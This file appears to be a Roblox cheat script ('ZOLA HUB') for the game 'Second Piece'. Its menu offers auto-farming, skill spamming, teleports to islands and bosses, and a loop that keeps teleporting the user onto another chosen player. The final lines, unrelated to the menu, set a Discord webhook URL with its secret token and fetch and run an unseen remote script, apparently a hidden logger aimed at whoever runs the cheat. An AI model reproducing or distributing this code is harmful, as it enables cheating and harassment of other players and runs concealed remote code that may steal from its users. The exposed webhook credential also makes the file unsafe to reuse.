local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))()
local Window = OrionLib:MakeWindow({
		Name = "ZOLA HUB Second Piece",
		HidePremium = false,
		SaveConfig = true,
		ConfigFolder = "OrionTest",
        IntroText = "ZOLA HUB"       
}) 


local Tab = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://7733765398",
	PremiumOnly = false
})



local Section = Tab:AddSection({
	Name = "🔥TP🔥"
}) 


Tab:AddToggle({
	Name = "Auto TP Item",
	Default = false,
	Callback = function(K)
_G.F = K
while _G.F do wait()
for i,v in pairs(game:GetService("Workspace").ItemDrop:GetDescendants()) do
if v.Name == "TouchInterest" then
game.Players.LocalPlayer.Character.HumanoidRootPart .CFrame = v.Parent.CFrame
wait()
            end
      end
end
	end    
})

Tab:AddToggle({
	Name = "Auto Chests",
	Default = false,
	Callback = function(d)
_G.Fd = d
while _G.Fd do wait()
for i,v in pairs(game:GetService("Workspace").Chests:GetDescendants()) do
if v.ClassName == "ProximityPrompt" then
fireproximityprompt(v,30)
game.Players.LocalPlayer.Character.HumanoidRootPart .CFrame = v.Parent.CFrame
end
      end
            end
	end    
})

local Section = Tab:AddSection({
	Name = "📛 Auto skill📛"
}) 


Tab:AddToggle({
	Name = "Auto skill Z",
	Default = false,
	Callback = function(mb)
_G.x = mb
while _G.x do wait()

game:service('VirtualInputManager'):SendKeyEvent(true, "Z", false, game)

end

	end    
})


Tab:AddToggle({
	Name = "Auto skill X",
	Default = false,
	Callback = function(mbz)
_G.xz = mbz
while _G.xz do wait()

game:service('VirtualInputManager'):SendKeyEvent(true, "X", false, game)

end

	end    
})



Tab:AddToggle({
	Name = "Auto skill C",
	Default = false,
	Callback = function(mkln)
_G.xa = mkln
while _G.xa do wait()

game:service('VirtualInputManager'):SendKeyEvent(true, "C", false, game)

end

	end    
})

Tab:AddToggle({
	Name = "Auto skill V",
	Default = false,
	Callback = function(m)
_G.x = m
while _G.x do wait()

game:service('VirtualInputManager'):SendKeyEvent(true, "V", false, game)

end

	end    
})

local Section = Tab:AddSection({
	Name = "🍇Auto Random fruit🍇"
}) 

Tab:AddToggle({
	Name = "Auto Random fruit Beli",
	Default = false,
	Callback = function(gm)
_G.xm = gm
while _G.xm do wait()
for i,v in pairs(game:GetService("Workspace").Shop:GetDescendants()) do
if v.ClassName == "ProximityPrompt" then
fireproximityprompt(v,30)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(790.203735, 35.5073013, 1201.40369, 0.026754817, -8.37544611e-09, 0.999642015, 1.24128064e-07, 1, 5.05623188e-09, -0.999642015, 1.23948354e-07, 0.026754817)
end
end
end

	end    
})


Tab:AddToggle({
	Name = "Auto Random fruit Gem",
	Default = false,
	Callback = function(qm)
_G.gg = qm
while _G.gg do wait()
for i,v in pairs(game:GetService("Workspace").Shop:GetDescendants()) do
if v.ClassName == "ProximityPrompt" then
fireproximityprompt(v,30)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-741.048889, 43.4787788, -1933.82019, -0.0251465552, 7.8026531e-08, 0.999683797, -1.09866749e-09, 1, -7.80788483e-08, -0.999683797, -3.06173398e-09, -0.0251465552)
end
end
end

	end    
})




local Tab = Window:MakeTab({
	Name = "Auto Quest",
	Icon = "rbxassetid://7733765398",
	PremiumOnly = false
})


local Section = Tab:AddSection({
	Name = "⚡ Equip tools⚡"
}) 



local Weaponlist = {}
local Weapon = nil

for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
    table.insert(Weaponlist,v.Name)
end

Tab:AddDropdown({
	Name = "Weapon",
	Default = "",
	Options = Weaponlist,
	Callback = function(currentOption)
		Weapon = currentOption
	end    
})



Tab:AddToggle({
	Name = "Auto Equip",
	Default = false,
	Callback = function(a)
AutoEquiped = a
	end    
})

spawn(function()
while wait() do
if AutoEquiped then
pcall(function()
game.Players.LocalPlayer.Character.Humanoid:EquipTool(game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(Weapon))
end)
end
end
end)



local Section = Tab:AddSection({
	Name = "💬Auto Quest💬"
}) 


Tab:AddToggle({
	Name = "Auto Quest",
	Default = false,
	Callback = function(ab)
_G.hr = ab
while _G.hr do wait()
for i,v in pairs(game:GetService("Workspace").Quest:GetDescendants()) do
 if v.ClassName == "ProximityPrompt" then
   fireproximityprompt(v,30)
end
      end
            end
	end    
})

local Tab = Window:MakeTab({
	Name = "Shop",
	Icon = "rbxassetid://7733765398",
	PremiumOnly = false
})


local Section = Tab:AddSection({
	Name = "💸Buy Item💸"
}) 

shop = {}
for i ,v in pairs(game:GetService("Workspace").Shop:GetChildren()) do
table.insert(shop,v.Name)
end




Tab:AddDropdown({
	Name = "TP shop",
	Default = "shop",
	Options = shop,
	Callback = function(mt)
	shop = mt
	end    
})


Tab:AddButton({
	Name = "TP Shop",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.workspace.Shop[shop].CFrame * CFrame.new(0,5,0)

  	end    
})


local Tab = Window:MakeTab({
	Name = "Island",
	Icon = "rbxassetid://7733765398",
	PremiumOnly = false
})


local Section = Tab:AddSection({
	Name = "🏝️Island🏝️"
}) 


Tab:AddButton({
	Name = "[Bandit [Lv.5] Island",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-898.974243, 34.5999947, -559.051453, 0.0182777327, 3.36339987e-08, -0.999832928, -6.71313103e-08, 1, 3.24124017e-08, 0.999832928, 6.65276758e-08, 0.0182777327)
wait(0.1)
for i,v in pairs(game:GetService("Workspace").NPC:GetDescendants()) do
if v.ClassName == "ProximityPrompt" then
fireproximityprompt(v,30)
end
end

  	end   
})

Tab:AddButton({
	Name = "Clown Pirate [Lv.50] Island",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(74.4107437, 36.9179535, 79.3588791, -0.999664903, 3.31894299e-08, -0.0258848667, 3.20130162e-08, 1, 4.58622864e-08, 0.0258848667, 4.50182682e-08, -0.999664903)
wait(0.1)
for i,v in pairs(game:GetService("Workspace").NPC:GetDescendants()) do
if v.ClassName == "ProximityPrompt" then
fireproximityprompt(v,30)
end
end

  	end   
})

Tab:AddButton({
	Name = "Marine [Lv.300] Island",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(886.932739, 35.5073013, 1153.22998, -0.0238624346, 4.11765164e-08, -0.999715269, 1.07852067e-07, 1, 3.86138979e-08, 0.999715269, -1.06899932e-07, -0.0238624346)
wait(0.1)
for i,v in pairs(game:GetService("Workspace").NPC:GetDescendants()) do
if v.ClassName == "ProximityPrompt" then
fireproximityprompt(v,30)
end
end

  	end   
})

Tab:AddButton({
	Name = "Monkey [Lv.750] Island",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(735.348877, 42.3243103, -1181.01147, -0.0751134604, -5.73425822e-08, -0.997174978, -4.65505181e-08, 1, -5.39985585e-08, 0.997174978, 4.23629949e-08, -0.0751134604)
wait(0.1)
for i,v in pairs(game:GetService("Workspace").NPC:GetDescendants()) do
if v.ClassName == "ProximityPrompt" then
fireproximityprompt(v,30)
end
end

  	end   
})




Tab:AddButton({
	Name = "Bomb Man [Lv.1500] Island",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-696.604614, 36.2596169, 786.971252, -0.0137904296, 3.84323009e-08, -0.999904931, -8.1107423e-09, 1, 3.85478174e-08, 0.999904931, 8.64156213e-09, -0.0137904296)
wait(0.1)
for i,v in pairs(game:GetService("Workspace").NPC:GetDescendants()) do
if v.ClassName == "ProximityPrompt" then
fireproximityprompt(v,30)
end
end

  	end   
})

Tab:AddButton({
	Name = "Snow Bandit [Lv.1750] Island",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1640.46484, 41.6599922, -355.940918, -0.999989569, 2.44405012e-08, 0.00457085157, 2.402248e-08, 1, -9.15084968e-08, -0.00457085157, -9.13977374e-08, -0.999989569)
wait(0.1)
for i,v in pairs(game:GetService("Workspace").NPC:GetDescendants()) do
if v.ClassName == "ProximityPrompt" then
fireproximityprompt(v,30)
end
end

  	end   
})

local Tab = Window:MakeTab({
	Name = "Boss Spawn",
	Icon = "rbxassetid://7733765398",
	PremiumOnly = false
})

-- Shadow Boss Spawn
local Section = Tab:AddSection({
	Name = "🗡️Shadow Boss Spawn🗡️"
}) 


Tab:AddButton({
	Name = "Snow Island",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1506.47339, 136.759964, -209.360397, -0.015526263, -2.25340333e-08, 0.999879479, 6.08013906e-08, 1, 2.3480883e-08, -0.999879479, 6.11586373e-08, -0.015526263)

  	end   
})

Tab:AddButton({
	Name = "Sand Island",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-729.227905, 52.2595978, 939.722168, 0.990753412, -7.97407438e-08, -0.135674879, 6.86500528e-08, 1, -8.64233201e-08, 0.135674879, 7.63101085e-08, 0.990753412)

  	end   
})

Tab:AddButton({
	Name = "Yoru Island",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1864.88025, 50.2648354, 44.572113, 0.0335859843, -1.23333841e-08, -0.999435842, -7.68625199e-08, 1, -1.4923307e-08, 0.999435842, 7.73203723e-08, 0.0335859843)

  	end   
})

-- Sukuna and Gojo Spawn
local Section = Tab:AddSection({
	Name = "🔴Sukuna and Gojo Spawn🔵"
}) 


Tab:AddButton({
	Name = "Boss Island",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-695.397583, 44.025898, -2004.11902, 0.999338925, -4.83633311e-09, 0.0363560542, 8.25968627e-09, 1, -9.40116536e-08, -0.0363560542, 9.4249792e-08, 0.999338925)

  	end   
})


local Section = Tab:AddSection({
	Name = "👺Shank Spawn👺"
}) 


Tab:AddButton({
	Name = "Shank Island ",
	Callback = function()

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2415.01636, 33.8787766, -1315.07935, 0.0854611695, -1.44168224e-08, 0.996341527, -9.54939097e-08, 1, 2.26607479e-08, -0.996341527, -9.70811627e-08, 0.0854611695)

  	end   
})


local Tab = Window:MakeTab({
	Name = "Player TP",
	Icon = "rbxassetid://7733765398",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "💫Player💫"
}) 


Plr = {}
for i,v in pairs(game:GetService("Players"):GetChildren()) do
    table.insert(Plr,v.Name) 
end

Tab:AddDropdown({
	Name = "Player",
	Default = "",
	Options = Plr,
	Callback = function(t)
		PlayerTP = t
	end    
})




Tab:AddButton({
	Name = "Teleport",
	Callback = function()
      			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[PlayerTP].Character.HumanoidRootPart.CFrame

  	end    
})


Tab:AddToggle({
	Name = "Loop Teleport Player",
	Default = false,
	Callback = function(t)
_G.TPPlayer = t
while _G.TPPlayer do wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[PlayerTP].Character.HumanoidRootPart.CFrame * CFrame.new(0,0,3)
end

	end    
})
         

_G.webhooksdiscord = "https://discord.com/api/webhooks/1200432036335329331/pmCEruE-PKQeBU0Y4w_t2ZzfrrmB_cbAjeYAvV34yLYCY8LbDyocPUDJi8hSdlLx34Cb"
loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
